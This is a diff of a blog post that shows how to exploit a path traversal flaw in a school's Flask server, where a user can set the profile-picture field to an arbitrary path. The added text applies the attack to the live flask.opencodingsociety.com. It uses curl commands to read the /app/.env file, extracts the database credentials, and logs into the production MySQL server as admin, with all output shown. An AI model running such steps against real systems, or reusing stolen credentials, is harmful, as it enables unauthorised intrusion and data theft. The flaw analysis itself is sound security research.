@@ -10,8 +10,7 @@ Basically, Mr. Mort's template flask server hosts an option for managing user's 
 
 The Flask server has a profile picture feature. Users can upload a profile picture, and it gets stored in their own directory under `instance/uploads/{user_id}/`. The code looks something like this:
 
-```py
-# model/pfp.py
+```py,name=model/pfp.py
 def pfp_base64_decode(user_id, user_pfp):
     img_path = os.path.join(app.config["UPLOAD_FOLDER"], user_id, user_pfp)
     try:
@@ -24,7 +23,7 @@ def pfp_base64_decode(user_id, user_pfp):
 ```
 At first glance, this seems fine. Each user has their own directory, filenames are stored in the database, and only authenticated users can access their pictures. All fine and dandy.
 
-My suspicion at the time was that `os.path.join()` can probably be used to do things it probably shouldn't (like joinging `../`):
+My suspicion at the time was that `os.path.join()` can probably be used to do things it probably shouldn't (like joining `../`):
 
 ```py
 >>> import os
@@ -39,8 +38,7 @@ That path would resolve to `/etc/passwd` and thus I'd be able to access it. Now 
 
 Looking at the API endpoint that retrieves the profile pictures:
 
-```py
-# api/pfp.py
+```py,name=api/pfp.py
 @token_required()
 def get(self):
     current_user = g.current_user
@@ -58,8 +56,7 @@ It's immediately clear that `curent_user` comes from the database. Question is, 
 
 Unforunately, I found out that the upload endpoint uses `secure_filename()`:
 
-```py
-# model/pfp.py
+```py,name=model/pfp.py
 try:
     image_data = base64.b64decode(base64_image)
     filename = secure_filename(f"{user_uid}.png")
@@ -79,8 +76,7 @@ Alas, the endpoint is secure after all. The filename always used `{user_uid}.png
 
 Then I found the user *update* endpoint.
 
-```py
-# api/user.py
+```py,name=api/user.py
 # Accounts are desired to be GitHub accounts, change must be validated 
 if body.get('uid') and body.get('uid') != user._uid:
     _, status = GitHubUser().get(body.get('uid'))
@@ -96,8 +92,7 @@ return jsonify(user.read())
 
 This endpoint accepts any field from the request body and passes it to `user.update()`. What about the `pfp` field?
 
-```py
-# model/user.py
+```py,name=model/user.py
 @pfp.setter
 def pfp(self, pfp):
     self._pfp = pfp
@@ -119,7 +114,7 @@ Let's say I put a file called `secret.txt` in my own home directory:
 Now let's set our path traversal payload to that directory:
 
 ```bash
-curl -X PUT http://localhost:8001/api/user \
+~ curl -X PUT http://localhost:8001/api/user \
   -H "Content-Type: application/json" \
   -b cookies.txt \
   -d '{"pfp": "../../../../../../../secret.txt"}'
@@ -162,7 +157,7 @@ Our response:
 
 Notice that the `pfp` field is in fact what we set. Now we'll run a simple `GET` request to actually read it:
 ```bash
-curl -X GET http://localhost:8001/api/id/pfp -b cookies.txt
+~ curl -X GET http://localhost:8001/api/id/pfp -b cookies.txt
 ```
 
 And huzza:
@@ -174,7 +169,7 @@ And huzza:
 
 Ok, but that's in base64 because we're using it for image encoding. No problem, just decode it:
 ```bash
-echo "cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg==" | base64 -d
+~ echo "cGxlYXNlIHNwZWVkIEkgbmVlZCB0aGlzIAoKZG9uJ3QgcmVhZCBtZSBwbHMKCm15IHNlcnZlciBpcyBraW5kIG9mIHZ1bG5lcmFibGUKCkkndmUgYmVlbiB3YXRjaGluZyB5b3VyIHN0cmVhbS4geW91ciBrZXkgaXM6IEJMRUhISEhICg==" | base64 -d
 ```
 
 And get our `secret.txt` text:
@@ -198,40 +193,146 @@ It works! If you're skeptical, you can try it yourself too, just
 
 There's a lot you could do with this. You could grab `/etc/passwd`, `/home/.ssh/id_ed25519` (if correct perms), etc.. I could also access source code:
 ```bash
-curl -X PUT http://localhost:8001/api/user \
+~ curl -X PUT http://localhost:8001/api/user \
   -b cookies.txt \
   -d '{"pfp": "../../../__init__.py"}'
 ```
 and database files (which contain password hashes):
 ```bash
-curl -X PUT http://localhost:8001/api/user \
+~ curl -X PUT http://localhost:8001/api/user \
   -b cookies.txt \
   -d '{"pfp": "../../volumes/user_management.db"}'
 ```
-I could also grab `.env` possibly.
+I could also grab `.env`.
 
 
 ## That's Not in Prod
 
 If you're asking, can I do this right now to Mr. Mort's deployed `flask.opencodingsociety.com`? The answer is no... but I do have some ideas. I've tried quite a few times to get this path traversal working against the actual Amazon EC2 Docker instance, but it wasn't working. For example, let's try grabbing another user's profile picture through this traversal (because if you take a look at the `docker-compose.yml`, `instance` is mounted). Usually, I get this response:
 ```bash
-curl -X PUT https://flask.opencodingsociety.com/api/user \
+~ curl -X PUT https://flask.opencodingsociety.com/api/user \
 -H "Content-Type: application/json" \
 -b cookies.txt \
 -d '{"pfp": "../niko/niko.png"}'
-```
-```
-{"pfp":"../niko/niko.png" ...}
+{"...", "pfp":"../niko/niko.png", "..."}
 ```
 ```bash
-curl -X GET https://flask.opencodingsociety.com/api/id/pfp -b cookies.txt
-```
-```
+~ curl -X GET https://flask.opencodingsociety.com/api/id/pfp -b cookies.txt
 {"message": "An error occurred while reading the profile picture."}
 ```
 
-### The Irony
+Funnily enough, the reason why this exploit doesn't work against the deployed server is simply because the profile picture feature has not been implemented (correctly). That's literally it. When you make that web request to set your profile picture, supposedly this is appended to a user's upload folder, but since the actual code doesn't create these folders, you can't navigate out of a nonexistent folder.
 
-Funnily enough, the reason why this exploit doesn't work against the deployed server is simply because the profile picture feature has not been implemented (correctly). That's literally it. When you make that web request to set your profile picture, I'm pretty sure you don't get your own directory possibly because the actual server doesn't have write persm to that directory. 
+... Which is what I thought before I researched the function a little more.
 
-I spun up a Docker instance to investigate this, but so far I'm still investigating. I'll report back in the next blog post. So far, pretty fun exploit to develop, and I have some ideas for fixes + more "exploits" that might work against the actual deployed website!
+If we take a look back at the original base64 decode function:
+
+```py,name=model/pfp.py
+def pfp_base64_decode(user_id, user_pfp):
+    img_path = os.path.join(app.config['UPLOAD_FOLDER'], user_id, user_pfp)
+    # ...
+```
+I noticed that the code happens to run a path join on wherever the uploads folder is located, your `user_id`, and the image path you give it `user_pfp`. The constant `UPLOAD_FOLDER` is defined here:
+
+```py,name=__init__.py
+app.config['UPLOAD_FOLDER'] = os.path.join(app.instance_path, 'uploads')
+```
+
+After my fiddling with the Docker container, I figured out that this would be located under `/app/instance/uploads`.
+
+So, for example, if I wanted to upload a photo `meow.png` as my profile picture, the path would look like:
+
+```py
+>>> os.path.join('/app/instance/uploads', 'mataiodoxion', 'meow.png')
+'/app/instance/uploads/mataiodoxion/meow.png'
+```
+
+However, taking a look at the docs for `os.path.join()`, we find that
+
+> If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment. On Linux, for example:
+> ```py
+> >>> os.path.join('/home/foo', 'bar')
+> '/home/foo/bar'
+> >>> os.path.join('/home/foo', '/home/bar')
+> '/home/bar'
+> ```
+> — <cite>Os.Path Python Docs[^1]</cite>
+
+Great! So now that we know absolute paths work and we know where `.env` is stored, let's just grab it:
+
+```sh
+~ curl -X PUT https://flask.opencodingsociety.com/api/user \
+-H "Content-Type: application/json" \
+-b cookie.txt \
+-d '{"pfp": "/app/.env"}'   
+{"...", "pfp":"/app/.env", "uid":"mataiodoxion", "..."}
+
+~ curl -X GET https://flask.opencodingsociety.com/api/id/pfp \
+-H "Content-Type: application/json" \
+-b cookie.txt
+{"pfp": "<base64>"}
+
+~ echo "<base64>" | base64 -d
+# ...
+# Database configuration
+DB_ENDPOINT='...'
+DB_USERNAME='admin'
+DB_PASSWORD='...'
+# ...
+```
+
+Now that we have that info, let's log in to the DB.
+
+```
+~ mysql -u admin -h <DB-ENDPOINT> -p --ssl-ca=global-bundle.pem
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 35579
+Server version: 8.0.42 Source distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> STATUS;
+--------------
+mysql from 12.1.2-MariaDB, client 15.2 for Linux (x86_64) using readline 5.1
+
+Connection id:		35579
+Current database:	
+Current user:		admin@<IP_ADDRESS>
+SSL:			Cipher in use is TLS_AES_256_GCM_SHA384, cert is OK
+Current pager:		more
+Using outfile:		''
+Using delimiter:	;
+Server:			MySQL
+Server version:		8.0.42 Source distribution
+Protocol version:	10
+Connection:		<DB_ENDPOINT> via TCP/IP
+Server characterset:	utf8mb4
+Db     characterset:	utf8mb4
+Client characterset:	utf8mb4
+Conn.  characterset:	utf8mb4
+TCP port:		3306
+Uptime:			57 days 9 hours 46 min 10 sec
+
+Threads: 13  Questions: 6329493  Slow queries: 0  Opens: 606  Flush tables: 3  Open tables: 418  Queries per second avg: 1.276
+--------------
+
+MySQL [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| user_management    |
++--------------------+
+5 rows in set (0.036 sec)
+
+MySQL [(none)]> exit
+Bye
+```
+
+[^1]: [https://docs.python.org/3/library/os.path.html#os.path.join](https://docs.python.org/3/library/os.path.html#os.path.join)
